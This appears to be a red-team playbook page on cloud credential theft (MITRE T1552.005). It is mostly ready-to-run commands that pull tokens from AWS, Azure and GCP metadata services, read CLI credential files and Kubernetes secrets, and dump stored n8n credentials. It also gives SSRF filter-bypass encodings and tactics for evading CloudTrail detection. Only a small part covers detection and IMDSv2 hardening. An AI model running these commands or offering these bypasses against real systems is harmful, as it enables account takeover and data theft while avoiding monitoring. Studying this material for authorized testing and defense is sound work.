# Cloud Credential Access

> **MITRE ATT&CK**: Credential Access > T1552.005 - Unsecured Credentials: Cloud Instance Metadata API
> **Platforms**: AWS / Azure / GCP
> **Required Privileges**: Instance access (SSRF, shell) / User (workstation credential theft)
> **OPSEC Risk**: Low-Medium

## Strategic Overview

Cloud credential access is fundamentally different from traditional Windows credential
extraction. Cloud credentials are tokens -- ephemeral, scoped, and often stored in
predictable locations. As a Red Team Lead, you must recognize that cloud credential theft
frequently bypasses MFA entirely because tokens represent already-authenticated sessions.

**Cloud credential access scenarios:**
1. **SSRF to metadata endpoint** - Steal instance role credentials from web applications
2. **Compromised workstation** - Extract CLI tokens from developer/admin machines
3. **Compromised instance** - Extract instance metadata credentials for lateral movement
4. **Environment variable leakage** - Credentials in Lambda/Function environment variables
5. **Credential files on disk** - Static credentials in config files, code, and repos

**Strategic value of cloud credentials:**
- Instance role credentials provide access to cloud APIs (S3, EC2, IAM, etc.)
- Managed identity tokens grant service-level access to cloud resources
- CLI tokens often have broader permissions than the web console (admin-level)
- Stolen tokens work from any network location (no VPN/network restrictions)

## Technical Deep-Dive

### 1. AWS Instance Metadata Service (IMDS)

```bash
# IMDSv1 (unauthenticated - just a GET request)
# If IMDSv1 is available, any process or SSRF can retrieve credentials

# List available IAM roles
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Retrieve temporary credentials for the role
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
# Returns: AccessKeyId, SecretAccessKey, Token (temporary STS credentials)

# Other useful metadata
curl http://169.254.169.254/latest/meta-data/instance-id
curl http://169.254.169.254/latest/meta-data/hostname
curl http://169.254.169.254/latest/meta-data/network/interfaces/macs/
curl http://169.254.169.254/latest/user-data           # Often contains secrets/bootstrap scripts
curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance

# IMDSv2 (token-based - requires PUT request first)
# Prevents simple SSRF exploitation (but not if attacker has shell access)
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME

# Using stolen credentials
export AWS_ACCESS_KEY_ID="AKIA..."
export AWS_SECRET_ACCESS_KEY="secret..."
export AWS_SESSION_TOKEN="token..."
aws sts get-caller-identity     # Verify identity
aws s3 ls                       # Enumerate S3 buckets
aws iam list-users              # Enumerate IAM users
```

### 2. AWS Credential Files and Environment

```bash
# AWS CLI credential file (persistent credentials)
cat ~/.aws/credentials
# [default]
# aws_access_key_id = AKIA...
# aws_secret_access_key = ...

# AWS CLI config
cat ~/.aws/config
# [default]
# region = us-east-1
# [profile admin]
# role_arn = arn:aws:iam::123456789012:role/Admin

# Environment variables (common in CI/CD and containers)
env | grep -i aws
# AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, AWS_SESSION_TOKEN
# AWS_PROFILE, AWS_DEFAULT_REGION

# Lambda function environment variables (from within Lambda)
env | grep -i aws
# Lambda injects: AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, AWS_SESSION_TOKEN
# These are the Lambda execution role credentials

# ECS container credentials (different endpoint)
curl http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI
# Returns task role credentials

# Search for AWS keys in files
grep -r "AKIA" /home/ /opt/ /var/ 2>/dev/null         # Access key IDs start with AKIA
grep -r "aws_secret_access_key" /home/ /opt/ 2>/dev/null
```

### 3. Azure Instance Metadata Service

```bash
# Azure IMDS - retrieve managed identity token
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# Retrieve token for different resources
# Azure Resource Manager
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# Microsoft Graph
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com/"

# Azure Key Vault
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net/"

# Azure Storage
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://storage.azure.com/"

# Instance metadata (non-credential, but useful for recon)
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | python3 -m json.tool

# User-assigned managed identity (specify client_id)
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/&client_id=CLIENT_ID"
```

### 4. Azure CLI and PowerShell Token Caches

```bash
# Azure CLI token cache (MSAL-based, newer versions)
cat ~/.azure/msal_token_cache.json
# Contains: access_token, refresh_token, client_id, tenant_id

# Azure CLI profile (subscription and tenant info)
cat ~/.azure/azureProfile.json

# Azure PowerShell token cache
cat ~/.Azure/TokenCache.dat              # Legacy
cat ~/.Azure/AzureRmContext.json         # Context with tokens

# Windows locations
type %USERPROFILE%\.azure\msal_token_cache.json
type %USERPROFILE%\.azure\azureProfile.json

# Extract token using Azure CLI (if available)
az account get-access-token --resource https://management.azure.com/
az account get-access-token --resource https://graph.microsoft.com/

# Use stolen token with Azure REST API
curl -H "Authorization: Bearer $TOKEN" \
  "https://management.azure.com/subscriptions?api-version=2020-01-01"

# Use stolen token with Azure CLI
az account set --subscription "sub-id"
# Or inject token directly via REST calls
```

### 5. GCP Metadata Service

```bash
# GCP metadata endpoint (requires Metadata-Flavor header)
curl -H "Metadata-Flavor: Google" \
  "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token"
# Returns: access_token, expires_in, token_type

# Service account email
curl -H "Metadata-Flavor: Google" \
  "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email"

# List available scopes
curl -H "Metadata-Flavor: Google" \
  "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/scopes"

# Instance metadata
curl -H "Metadata-Flavor: Google" \
  "http://169.254.169.254/computeMetadata/v1/instance/?recursive=true"

# Project metadata (may contain startup scripts with secrets)
curl -H "Metadata-Flavor: Google" \
  "http://169.254.169.254/computeMetadata/v1/project/attributes/"

# Custom metadata (often contains secrets)
curl -H "Metadata-Flavor: Google" \
  "http://169.254.169.254/computeMetadata/v1/instance/attributes/"

# Kubernetes service account token (GKE)
cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

### 6. GCP Credential Files

```bash
# Application default credentials
cat ~/.config/gcloud/application_default_credentials.json
# Contains: client_id, client_secret, refresh_token, type

# gcloud CLI credentials database
cat ~/.config/gcloud/credentials.db      # SQLite with refresh tokens

# Service account key files (JSON)
find / -name "*.json" -exec grep -l "private_key" {} \; 2>/dev/null
# Look for: "type": "service_account", "private_key": "-----BEGIN RSA PRIVATE KEY-----"

# GCP properties
cat ~/.config/gcloud/properties
# Contains: project, account, region

# Using stolen credentials
export GOOGLE_APPLICATION_CREDENTIALS="/path/to/stolen-key.json"
gcloud auth activate-service-account --key-file=/path/to/stolen-key.json
gcloud projects list
gcloud compute instances list

# Using stolen access token
curl -H "Authorization: Bearer $TOKEN" \
  "https://cloudresourcemanager.googleapis.com/v1/projects"
```

### 7. Automation Platform Credential Harvesting

Workflow automation platforms (n8n, Apache Airflow, Rundeck, StackStorm) deployed in cloud
environments often hold AWS credentials, API keys, and database connection strings. When
these platforms are compromised (via RCE, default credentials, or SSRF), their stored
credentials provide a path to cloud infrastructure.

#### n8n Workflow Automation

n8n is a popular open-source workflow automation tool frequently deployed on AWS EC2 instances.
When the n8n instance runs on EC2 with an attached IAM role, an attacker with access to the n8n
interface can harvest AWS context without needing SSH access to the underlying host:

```bash
# n8n exposes an HTTP Request node that can query IMDS from the host
# If n8n is running on EC2, create a workflow with an HTTP Request node targeting:
# URL: http://169.254.169.254/latest/meta-data/iam/security-credentials/
# Method: GET
# This returns the IAM role name attached to the EC2 instance

# Follow up with a second request to retrieve credentials:
# URL: http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE_NAME>
# Returns: AccessKeyId, SecretAccessKey, Token

# n8n credential stores to check:
# - Built-in credential manager (accessible via API or UI)
# - Environment variables passed to the n8n container/process
# - Workflow definitions may contain hardcoded API keys and tokens

# n8n API credential extraction (if API access is available):
curl -H "X-N8N-API-KEY: <key>" http://target:5678/api/v1/credentials
# Returns all stored credentials (database passwords, API keys, OAuth tokens)

# n8n critical vulnerabilities (2025):
# Two maximum-severity vulns allow any authenticated user to achieve
# full server control and steal all stored credentials including
# AWS keys, OAuth tokens, and API secrets
```

**Key insight**: The n8n HTTP Request node executes from the server's network context, making
it functionally equivalent to SSRF. An operator with workflow creation permissions can use
this to query internal services, cloud metadata endpoints, and other resources accessible
from the n8n host's network position.

> **Reference**: watson0x90. When Your Automation Box Talks to the Cloud: Harvesting AWS
> Context from n8n Workflows.
> https://watson0x90.com/when-your-automation-box-talks-to-the-cloud-harvesting-aws-context-from-n8n-workflows-08e1a58aa1b9

### 8. SSRF to Metadata Endpoints

```bash
# SSRF is the primary cloud initial access vector for metadata theft
# Common SSRF targets:

# AWS
http://169.254.169.254/latest/meta-data/iam/security-credentials/
# Bypass: http://[::ffff:169.254.169.254]/, decimal IP: http://2852039166/

# Azure
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
# Requires Metadata: true header (harder to exploit via blind SSRF)

# GCP
http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
# Requires Metadata-Flavor: Google header

# Common SSRF bypass techniques:
# URL encoding: http://%31%36%39%2e%32%35%34%2e%31%36%39%2e%32%35%34/
# Decimal: http://2852039166/
# Hex: http://0xa9fea9fe/
# Octal: http://0251.0376.0251.0376/
# IPv6: http://[::ffff:169.254.169.254]/
# DNS rebinding: Create DNS record pointing to 169.254.169.254
```

### 9. Kubernetes and Container Credentials

```bash
# Kubernetes service account token (mounted automatically)
cat /var/run/secrets/kubernetes.io/serviceaccount/token
cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace

# Use the service account token
KUBE_TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -k -H "Authorization: Bearer $KUBE_TOKEN" \
  https://kubernetes.default.svc/api/v1/namespaces/default/secrets

# Docker environment variables (secrets often passed as env vars)
env | sort

# Docker secrets (if mounted)
ls /run/secrets/
cat /run/secrets/*

# Kubernetes secrets (via kubectl if available)
kubectl get secrets --all-namespaces
kubectl get secret SECRET_NAME -o jsonpath='{.data}' | base64 -d

# Cloud provider credentials in Kubernetes
# EKS: IAM roles for service accounts (IRSA) - check AWS_WEB_IDENTITY_TOKEN_FILE
# AKS: Azure managed identity via IMDS
# GKE: Workload Identity or node service account via metadata
```

## Detection & Evasion

### Detection Indicators

| Indicator | Source | Detail |
|-----------|--------|--------|
| IMDS access from application | CloudTrail / Cloud audit logs | Unusual metadata API calls |
| Credential use from unexpected IP | CloudTrail | Token used from non-instance IP |
| Excessive API enumeration | CloudTrail / Azure Activity Log | Rapid API calls post-credential theft |
| IMDSv2 token creation | Instance logs | PUT requests to metadata token endpoint |
| Service account key usage | GCP audit logs | Key used from unexpected location |

### Evasion Techniques

1. **Use credentials from the same region/VPC** - Reduces geographic anomaly alerts
2. **Limit API calls** - Avoid enumeration; target specific known resources
3. **Use short-lived tokens** - STS temporary credentials expire, reducing exposure window
4. **Proxy through the instance** - Use compromised instance as proxy for API calls
5. **Respect rate limits** - Avoid triggering throttling-based alerts
6. **Match user-agent** - Use the same SDK user-agent as the legitimate application

### IMDSv2 Considerations

```
# IMDSv2 mitigations:
# - Requires PUT request for token (blocks simple SSRF GET requests)
# - Token TTL is configurable (default 6 hours)
# - Token cannot traverse network hops (X-Forwarded-For header causes rejection)
# - Does NOT block: local process credential theft, shell access, WAF bypass SSRF

# Check if IMDSv1 is disabled:
curl -s -o /dev/null -w "%{http_code}" http://169.254.169.254/latest/meta-data/
# 200 = IMDSv1 available, 401 = IMDSv2 enforced

# AWS CLI command to enforce IMDSv2:
# aws ec2 modify-instance-metadata-options --instance-id i-xxx --http-tokens required
```

## Cross-References

- [Credential Stores](credential-stores.md) - Broader credential extraction including cloud CLIs
- [DPAPI Abuse](dpapi-abuse.md) - Decrypt locally cached cloud credentials on Windows
- ../03-initial-access/ - SSRF as initial access to cloud credentials
- ../08-privilege-escalation/ - Cloud IAM privilege escalation with stolen credentials
- ../11-cloud-attack-paths/ - Full cloud attack methodology
- ../06-lateral-movement/ - Cloud-to-cloud and cloud-to-on-prem lateral movement

## References

- https://attack.mitre.org/techniques/T1552/005/
- https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html
- https://docs.microsoft.com/en-us/azure/active-directory/managed-identities-azure-resources/
- https://cloud.google.com/compute/docs/metadata/overview
- https://hackingthe.cloud/
- https://github.com/NetSPI/MicroBurst (Azure)
- https://github.com/RhinoSecurityLabs/pacu (AWS)
- https://github.com/dirkjanm/ROADtools (Azure AD)
- watson0x90. When Your Automation Box Talks to the Cloud: Harvesting AWS Context from n8n Workflows: https://watson0x90.com/when-your-automation-box-talks-to-the-cloud-harvesting-aws-context-from-n8n-workflows-08e1a58aa1b9
